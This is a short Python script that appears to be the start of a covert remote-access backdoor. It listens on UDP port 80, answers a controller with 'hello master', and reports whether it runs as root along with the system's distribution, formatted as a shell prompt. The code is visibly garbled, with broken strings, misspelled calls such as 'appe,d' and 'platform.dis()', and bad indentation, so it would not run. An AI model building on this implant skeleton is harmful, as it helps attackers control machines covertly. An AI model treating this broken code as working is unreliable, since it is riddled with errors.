#! /usr/bin/python

import socket 
import os
import sys
import platform

def launch():
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.bind((", 80))
  launch = s.recvfrom(1024)
  addr = launch[1][0]
  port = launch[1][1]
  s.sendto('hello master', (addr, port))
  return s, addr, port

s, addr, port = launch()

def getsysinfo():
  que = s.recvfrom(1024)
  prompt = []
  if que [1][0] == addr and que[1][1] == port:
      if os.getuid() == 0:
          prompt.appe,d('root@')
          prompt.apppend('# ")
      else:
          prompt.append('user@')
          prompt.append('$ ')
      prompt.insert(1, platform.dis()[0])
    s.sendto(''.join(prompt), (addr, port))
    return
    
getsysinfo()
